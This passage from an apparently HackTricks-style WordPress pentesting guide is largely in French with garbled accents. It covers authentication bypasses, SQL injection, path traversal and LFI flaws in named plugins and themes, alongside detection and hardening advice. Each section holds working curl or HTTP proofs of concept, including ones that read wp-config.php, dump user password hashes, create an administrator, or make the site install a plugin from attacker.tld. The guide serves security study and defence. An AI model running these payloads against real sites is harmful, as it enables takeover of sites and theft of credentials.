1. **Entr√©e utilisateur non assainie** ‚Äì `parentid` provient directement de la requ√™te HTTP.
2. **Concat√©nation de cha√Ænes dans la clause WHERE** ‚Äì pas d'`is_numeric()` / `esc_sql()` / prepared statement.
3. **Acc√®s sans authentification** ‚Äì bien que l'action soit ex√©cut√©e via `admin-post.php`, la seule v√©rification en place est un **CSRF nonce** (`wp_verify_nonce()`), que n'importe quel visiteur peut r√©cup√©rer depuis une page publique int√©grant le shortcode `[wpjobportal_my_resumes]`.

#### Exploitation

1. R√©cup√©rer un nonce r√©cent :
```bash
curl -s https://victim.com/my-resumes/ | grep -oE 'name="_wpnonce" value="[a-f0-9]+' | cut -d'"' -f4
```
2. Injecter du SQL arbitraire en abusant de `parentid` :
```bash
curl -X POST https://victim.com/wp-admin/admin-post.php \
-d 'task=savecategory' \
-d '_wpnonce=<nonce>' \
-d 'parentid=0 OR 1=1-- -' \
-d 'cat_title=pwn' -d 'id='
```
La r√©ponse divulgue le r√©sultat de la requ√™te inject√©e ou modifie la base de donn√©es, prouvant une SQLi.


### T√©l√©chargement arbitraire de fichier sans authentification / Path Traversal (WP Job Portal <= 2.3.2)

Une autre t√¢che, **downloadcustomfile**, permettait aux visiteurs de t√©l√©charger **n'importe quel fichier sur le disque** via path traversal. Le sink vuln√©rable se trouve dans `modules/customfield/model.php::downloadCustomUploadedFile()`:
```php
$file = $path . '/' . $file_name;
...
echo $wp_filesystem->get_contents($file); // raw file output
```
`$file_name` est contr√¥l√© par l'attaquant et concat√©n√© **sans assainissement**. Encore une fois, la seule barri√®re est un **CSRF nonce** qui peut √™tre r√©cup√©r√© depuis la page de CV.

#### Exploitation
```bash
curl -G https://victim.com/wp-admin/admin-post.php \
--data-urlencode 'task=downloadcustomfile' \
--data-urlencode '_wpnonce=<nonce>' \
--data-urlencode 'upload_for=resume' \
--data-urlencode 'entity_id=1' \
--data-urlencode 'file_name=../../../wp-config.php'
```
Le serveur renvoie le contenu de `wp-config.php`, leaking DB credentials and auth keys.

## Prise de contr√¥le de compte non authentifi√©e via Social Login AJAX fallback (Jobmonster Theme <= 4.7.9)

Beaucoup de th√®mes/plugins fournissent des helpers "social login" expos√©s via admin-ajax.php. Si une action AJAX non authentifi√©e (wp_ajax_nopriv_...) fait confiance √† des identifiants fournis par le client lorsque les donn√©es du provider sont absentes, puis appelle wp_set_auth_cookie(), cela devient un full authentication bypass.

Sch√©ma typique d√©fectueux (simplifi√©)
```php
public function check_login() {
// ... request parsing ...
switch ($_POST['using']) {
case 'fb':     /* set $user_email from verified Facebook token */ break;
case 'google': /* set $user_email from verified Google token   */ break;
// other providers ...
default: /* unsupported/missing provider ‚Äì execution continues */ break;
}

// FALLBACK: trust POSTed "id" as email if provider data missing
$user_email = !empty($user_email)
? $user_email
: (!empty($_POST['id']) ? esc_attr($_POST['id']) : '');

if (empty($user_email)) {
wp_send_json(['status' => 'not_user']);
}

$user = get_user_by('email', $user_email);
if ($user) {
wp_set_auth_cookie($user->ID, true); // üî• logs requester in as that user
wp_send_json(['status' => 'success', 'message' => 'Login successfully.']);
}
wp_send_json(['status' => 'not_user']);
}
// add_action('wp_ajax_nopriv_<social_login_action>', [$this, 'check_login']);
```
Pourquoi c'est exploitable

- Accessible sans authentification via admin-ajax.php (wp_ajax_nopriv_‚Ä¶ action).
- Pas de v√©rifications nonce/capability avant un changement d'√©tat.
- Absence de v√©rification du provider OAuth/OpenID ; la branche par d√©faut accepte l'entr√©e de l'attacker.
- get_user_by('email', $_POST['id']) suivi de wp_set_auth_cookie($uid) authentifie le requ√©rant comme n'importe quelle adresse e-mail existante.

Exploitation (unauthenticated)

- Pr√©requis : attacker peut atteindre /wp-admin/admin-ajax.php et conna√Æt/devine une adresse e-mail utilisateur valide.
- D√©finir provider sur une valeur non prise en charge (ou l'omettre) pour atteindre la branche par d√©faut et envoyer id=<victim_email>.
```http
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: victim.tld
Content-Type: application/x-www-form-urlencoded

action=<vulnerable_social_login_action>&using=bogus&id=admin%40example.com
```

```bash
curl -i -s -X POST https://victim.tld/wp-admin/admin-ajax.php \
-d "action=<vulnerable_social_login_action>&using=bogus&id=admin%40example.com"
```
Expected success indicators

- HTTP 200 with JSON body like {"status":"success","message":"Login successfully."}.
- Set-Cookie: wordpress_logged_in_* for the victim user; subsequent requests are authenticated.

Finding the action name

- Inspect the theme/plugin for add_action('wp_ajax_nopriv_...', '...') registrations in social login code (e.g., framework/add-ons/social-login/class-social-login.php).
- Utiliser grep pour wp_set_auth_cookie(), get_user_by('email', ...) dans les gestionnaires AJAX.

Detection checklist

- Web logs showing unauthenticated POSTs to /wp-admin/admin-ajax.php with the social-login action and id=<email>.
- 200 responses with the success JSON immediately preceding authenticated traffic from the same IP/User-Agent.

Hardening

- Do not derive identity from client input. Only accept emails/IDs originating from a validated provider token/ID.
- Require CSRF nonces and capability checks even for login helpers; avoid registering wp_ajax_nopriv_ unless strictly necessary.
- Validate and verify OAuth/OIDC responses server-side; reject missing/invalid providers (no fallback to POST id).
- Consider temporarily disabling social login or virtually patching at the edge (block the vulnerable action) until fixed.

Patched behaviour (Jobmonster 4.8.0)

- Removed the insecure fallback from $_POST['id']; $user_email must originate from verified provider branches in switch($_POST['using']).

## Unauthenticated privilege escalation via REST token/key minting on predictable identity (OttoKit/SureTriggers ‚â§ 1.0.82)

Some plugins expose REST endpoints that mint reusable ‚Äúconnection keys‚Äù or tokens without verifying the caller‚Äôs capabilities. If the route authenticates only on a guessable attribute (e.g., username) and does not bind the key to a user/session with capability checks, any unauthenticated attacker can mint a key and invoke privileged actions (admin account creation, plugin actions ‚Üí RCE).

- Vulnerable route (example): sure-triggers/v1/connection/create-wp-connection
- Flaw: accepts a username, issues a connection key without current_user_can() or a strict permission_callback
- Impact: full takeover by chaining the minted key to internal privileged actions

PoC ‚Äì mint a connection key and use it
```bash
# 1) Obtain key (unauthenticated). Exact payload varies per plugin
curl -s -X POST "https://victim.tld/wp-json/sure-triggers/v1/connection/create-wp-connection" \
-H 'Content-Type: application/json' \
--data '{"username":"admin"}'
# ‚Üí {"key":"<conn_key>", ...}

# 2) Call privileged plugin action using the minted key (namespace/route vary per plugin)
curl -s -X POST "https://victim.tld/wp-json/sure-triggers/v1/users" \
-H 'Content-Type: application/json' \
-H 'X-Connection-Key: <conn_key>' \
--data '{"username":"pwn","email":"p@t.ld","password":"p@ss","role":"administrator"}'
```
Pourquoi c'est exploitable
- Route REST sensible prot√©g√©e uniquement par une preuve d'identit√© √† faible entropie (username) ou absence de permission_callback
- Pas d'application des capabilities ; la cl√© √©mise est accept√©e comme un contournement universel

Checklist de d√©tection
- Grep plugin code for register_rest_route(..., [ 'permission_callback' => '__return_true' ])
- Toute route qui √©met des tokens/keys bas√©s sur une identit√© fournie par la requ√™te (username/email) sans lier √† un utilisateur authentifi√© ou √† une capability
- Rechercher les routes suivantes qui acceptent le token/la cl√© √©mise sans v√©rifications c√¥t√© serveur des capabilities

Durcissement
- Pour toute route REST privil√©gi√©e : exiger un permission_callback qui applique current_user_can() pour la capability requise
- Ne pas cr√©er de cl√©s √† longue dur√©e de vie √† partir d'une identit√© fournie par le client ; si n√©cessaire, √©mettre des tokens √† courte dur√©e de vie li√©s √† l'utilisateur apr√®s authentification et rev√©rifier les capabilities lors de l'utilisation
- Valider le contexte utilisateur de l'appelant (wp_set_current_user n'est pas suffisant seul) et rejeter les requ√™tes o√π !is_user_logged_in() || !current_user_can(<cap>)

---

## Mauvaise utilisation du m√©canisme nonce ‚Üí installation arbitraire de plugin sans authentification (FunnelKit Automations ‚â§ 3.5.3)

Nonce prevents CSRF, not authorization. Si le code consid√®re le passage d'un nonce comme un feu vert puis saute les v√©rifications de capability pour des op√©rations privil√©gi√©es (par ex., install/activate plugins), des attaquants non authentifi√©s peuvent satisfaire une exigence nonce faible et atteindre RCE en installant un plugin backdoor√© ou vuln√©rable.

- Vulnerable path: plugin/install_and_activate
- Faille: weak nonce hash check; no current_user_can('install_plugins'|'activate_plugins') once nonce ‚Äúpasses‚Äù
- Impact : compromission compl√®te via l'installation/l'activation arbitraire d'un plugin

PoC (la forme d√©pend du plugin ; illustratif uniquement)
```bash
curl -i -s -X POST https://victim.tld/wp-json/<fk-namespace>/plugin/install_and_activate \
-H 'Content-Type: application/json' \
--data '{"_nonce":"<weak-pass>","slug":"hello-dolly","source":"https://attacker.tld/mal.zip"}'
```
Checklist de d√©tection
- REST/AJAX handlers qui modifient plugins/themes en ne s'appuyant que sur wp_verify_nonce()/check_admin_referer() et sans v√©rification des capacit√©s
- Tout chemin de code qui d√©finit $skip_caps = true apr√®s la validation du nonce

Durcissement
- Traiter toujours les nonces uniquement comme des CSRF tokens ; appliquer des v√©rifications de capacit√©s ind√©pendamment de l'√©tat du nonce
- Exiger current_user_can('install_plugins') et current_user_can('activate_plugins') avant d'atteindre le code d'installation
- Refuser l'acc√®s non authentifi√© ; √©viter d'exposer nopriv AJAX actions pour des flux privil√©gi√©s

### Installateur de plugin AJAX Subscriber+ ‚Üí activation malveillante forc√©e (Motors Theme ‚â§ 5.6.81)

[Patchstack's analysis](https://patchstack.com/articles/critical-arbitrary-file-upload-vulnerability-in-motors-theme-affecting-20k-sites/) a montr√© comment le Motors theme fournit un helper AJAX authentifi√© pour installer son plugin compagnon :
```php
add_action('wp_ajax_mvl_theme_install_base', 'mvl_theme_install_base');

function mvl_theme_install_base() {
check_ajax_referer('mvl_theme_install_base', 'nonce');

$plugin_url  = sanitize_text_field($_GET['plugin']);
$plugin_slug = 'motors-car-dealership-classified-listings';

$upgrader = new Plugin_Upgrader(new Motors_Theme_Plugin_Upgrader_Skin(['plugin' => $plugin_slug]));
$upgrader->install($plugin_url);
mvl_theme_activate_plugin($plugin_slug);
}
```
- Seul `check_ajax_referer()` est appel√© ; il n'y a pas de `current_user_can('install_plugins')` ni de `current_user_can('activate_plugins')`.
- Le nonce est int√©gr√© dans la page d'administration Motors, donc tout Subscriber qui peut ouvrir `/wp-admin/` peut le copier depuis le HTML/JS.
- Le handler fait confiance au param√®tre `plugin` contr√¥l√© par l'attaquant (lu depuis `$_GET`) et le passe √† `Plugin_Upgrader::install()`, si bien qu'un ZIP distant arbitraire est t√©l√©charg√© dans `wp-content/plugins/`.
- Apr√®s l'installation, le th√®me appelle sans condition `mvl_theme_activate_plugin()`, garantissant l'ex√©cution du code PHP du plugin de l'attaquant.

#### Flux d'exploitation

1. Cr√©er/compromettre un compte √† faibles privil√®ges (Subscriber suffit) et r√©cup√©rer le nonce `mvl_theme_install_base` depuis l'interface du tableau de bord Motors.
2. Construire un ZIP de plugin dont le r√©pertoire de premier niveau correspond au slug attendu `motors-car-dealership-classified-listings/` et y int√©grer une backdoor ou un webshell dans les points d'entr√©e `*.php`.
3. H√©berger le ZIP et d√©clencher l'installateur en pointant le handler vers votre URL:
```http
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: victim.tld
Cookie: wordpress_logged_in_=...
Content-Type: application/x-www-form-urlencoded

action=mvl_theme_install_base&nonce=<leaked_nonce>&plugin=https%3A%2F%2Fattacker.tld%2Fmotors-car-dealership-classified-listings.zip
```
Parce que le handler lit `$_GET['plugin']`, le m√™me payload peut aussi √™tre envoy√© via la query string.

#### Detection checklist

- Rechercher dans themes/plugins `Plugin_Upgrader`, `Theme_Upgrader`, ou des helpers personnalis√©s `install_plugin.php` connect√©s aux hooks `wp_ajax_*` sans v√©rifications des capabilities.
- Inspecter tout handler qui prend un param√®tre `plugin`, `package`, `source` ou `url` et l'envoie aux upgrader APIs, surtout quand le slug est hard-coded mais que le contenu du ZIP n'est pas valid√©.
- Passer en revue les pages admin qui exposent des nonces pour les actions d'installateur ‚Äî si les Subscribers peuvent charger la page, assume the nonce leaks.

#### Hardening

- Gate installer AJAX callbacks avec `current_user_can('install_plugins')` et `current_user_can('activate_plugins')` apr√®s v√©rification du nonce ; Motors 5.6.82 a introduit cette v√©rification pour patcher le bug.
- Refuse untrusted URLs : limiter les installers aux ZIPs embarqu√©s ou √† des repositories de confiance, ou appliquer des manifests de t√©l√©chargement sign√©s.
- Traiter les nonces strictement comme des CSRF tokens ; ils n'apportent pas d'autorisation et ne doivent jamais remplacer les v√©rifications de capabilities.

---

## Unauthenticated SQLi via s search parameter in depicter-* actions (Depicter Slider ‚â§ 3.6.1)

Plusieurs actions depicter-* consommaient le param√®tre s (search) et le concat√©naient dans des requ√™tes SQL sans param√©trisation.

- Parameter: s (search)
- Flaw: direct string concatenation in WHERE/LIKE clauses; no prepared statements/sanitization
- Impact: exfiltration de la base de donn√©es (utilisateurs, hashes), mouvement lat√©ral

PoC
```bash
# Replace action with the affected depicter-* handler on the target
curl -G "https://victim.tld/wp-admin/admin-ajax.php" \
--data-urlencode 'action=depicter_search' \
--data-urlencode "s=' UNION SELECT user_login,user_pass FROM wp_users-- -"
```
Detection checklist
- Utiliser grep pour les gestionnaires d'action depicter-* et pour d√©tecter l'utilisation directe de $_GET['s'] ou $_POST['s'] dans des requ√™tes SQL
- Examiner les requ√™tes personnalis√©es pass√©es √† $wpdb->get_results()/query() qui concat√®nent s

Hardening
- Utiliser syst√©matiquement $wpdb->prepare() ou les placeholders wpdb ; rejeter c√¥t√© serveur les m√©tacaract√®res inattendus
- Ajouter une allowlist stricte pour s et normaliser vers le jeu de caract√®res/longueur attendus

---

## Unauthenticated Local File Inclusion via unvalidated template/file path (Kubio AI Page Builder ‚â§ 2.5.1)

Accepter des chemins contr√¥l√©s par l'attaquant dans un param√®tre de template sans normalisation ni confinement permet de lire des fichiers locaux arbitraires, et parfois d'ex√©cuter du code si des fichiers PHP/log inclusibles sont charg√©s √† l'ex√©cution.

- Parameter: __kubio-site-edit-iframe-classic-template
- Flaw: pas de normalisation/allowlisting ; travers√©e de r√©pertoires autoris√©e
- Impact: divulgation de secrets (wp-config.php), RCE potentiel dans certains environnements (empoisonnement des logs, PHP inclusible)

PoC ‚Äì lire wp-config.php
```bash
curl -i "https://victim.tld/?__kubio-site-edit-iframe-classic-template=../../../../wp-config.php"
```
Liste de contr√¥le de d√©tection
- Tout handler concat√©nant des chemins de requ√™te dans des sinks include()/require()/read sans confinement par realpath()
- Rechercher des patterns de traversal (../) atteignant en dehors du r√©pertoire de templates pr√©vu

Durcissement
- Appliquer des templates allowlist√©s ; r√©soudre via realpath() et exiger str_starts_with(realpath(file), realpath(allowed_base))
- Normaliser les entr√©es ; rejeter les s√©quences de traversal et les chemins absolus ; n'utiliser sanitize_file_name() que pour les noms de fichiers (pas pour des chemins complets)


## References

- [Unauthenticated Arbitrary File Deletion Vulnerability in Litho Theme](https://patchstack.com/articles/unauthenticated-arbitrary-file-delete-vulnerability-in-litho-the/)
- [Multiple Critical Vulnerabilities Patched in WP Job Portal Plugin](https://patchstack.com/articles/multiple-critical-vulnerabilities-patched-in-wp-job-portal-plugin/)
- [Rare Case of Privilege Escalation in ASE Plugin Affecting 100k+ Sites](https://patchstack.com/articles/rare-case-of-privilege-escalation-in-ase-plugin-affecting-100k-sites/)
- [ASE 7.6.3 changeset ‚Äì delete original roles on profile update](https://plugins.trac.wordpress.org/changeset/3211945/admin-site-enhancements/tags/7.6.3/classes/class-view-admin-as-role.php?old=3208295&old_path=admin-site-enhancements%2Ftags%2F7.6.2%2Fclasses%2Fclass-view-admin-as-role.php)
- [Hosting security tested: 87.8% of vulnerability exploits bypassed hosting defenses](https://patchstack.com/articles/hosting-security-tested-87-percent-of-vulnerability-exploits-bypassed-hosting-defenses/)
- [WooCommerce Payments ‚â§ 5.6.1 ‚Äì Unauth privilege escalation via trusted header (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/woocommerce-payments/vulnerability/wordpress-woocommerce-payments-plugin-5-6-1-unauthenticated-privilege-escalation-vulnerability)
- [Hackers exploiting critical WordPress WooCommerce Payments bug](https://www.bleepingcomputer.com/news/security/hackers-exploiting-critical-wordpress-woocommerce-payments-bug/)
- [Unpatched Privilege Escalation in Service Finder Bookings Plugin](https://patchstack.com/articles/unpatched-privilege-escalation-in-service-finder-bookings-plugin/)
- [Service Finder Bookings privilege escalation ‚Äì Patchstack DB entry](https://patchstack.com/database/wordpress/plugin/sf-booking/vulnerability/wordpress-service-finder-booking-6-0-privilege-escalation-vulnerability)
- [Unauthenticated Broken Authentication Vulnerability in WordPress Jobmonster Theme](https://patchstack.com/articles/unauthenticated-broken-authentication-vulnerability-in-wordpress-jobmonster-theme/)
- [Q3 2025‚Äôs most exploited WordPress vulnerabilities and how RapidMitigate blocked them](https://patchstack.com/articles/q3-2025s-most-exploited-wordpress-vulnerabilities-and-how-patchstacks-rapidmitigate-blocked-them/)
- [OttoKit (SureTriggers) ‚â§ 1.0.82 ‚Äì Privilege Escalation (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/suretriggers/vulnerability/wordpress-suretriggers-1-0-82-privilege-escalation-vulnerability)
- [FunnelKit Automations ‚â§ 3.5.3 ‚Äì Unauthenticated arbitrary plugin installation (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/wp-marketing-automations/vulnerability/wordpress-recover-woocommerce-cart-abandonment-newsletter-email-marketing-marketing-automation-by-funnelkit-plugin-3-5-3-missing-authorization-to-unauthenticated-arbitrary-plugin-installation-vulnerability)
- [Depicter Slider ‚â§ 3.6.1 ‚Äì Unauthenticated SQLi via s parameter (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/depicter/vulnerability/wordpress-depicter-slider-plugin-3-6-1-unauthenticated-sql-injection-via-s-parameter-vulnerability)
- [Kubio AI Page Builder ‚â§ 2.5.1 ‚Äì Unauthenticated LFI (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/kubio/vulnerability/wordpress-kubio-ai-page-builder-plugin-2-5-1-unauthenticated-local-file-inclusion-vulnerability)
- [Critical Arbitrary File Upload Vulnerability in Motors Theme Affecting 20k+ Sites](https://patchstack.com/articles/critical-arbitrary-file-upload-vulnerability-in-motors-theme-affecting-20k-sites/)

{{#include ../../banners/hacktricks-training.md}}
